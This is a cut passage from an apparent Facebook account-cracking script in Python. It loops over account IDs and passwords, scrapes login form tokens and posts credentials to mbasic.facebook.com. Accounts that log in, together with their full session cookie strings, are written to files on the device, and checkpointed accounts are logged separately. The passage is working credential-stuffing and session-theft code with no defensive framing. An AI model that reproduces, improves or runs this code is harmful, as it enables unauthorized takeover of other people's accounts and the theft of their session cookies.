w=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Aking=session.cookies.get_dict().keys()
                        if "c_user" in Aking:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [RASHID-OK] %s | %s'%(ids,pas))
                                open('/sdcard/RASHID-file-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/RASHID-file-coki-OK.txt', 'a').write(ids+' | '+pas+' | '+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        ##########print('\r\r\x1b[38;5;208m [ZAIN-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RASHID-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        except Exception as e:pass
        loop+=1



try:
	menu()
except requests.exceptions.ConnectionE
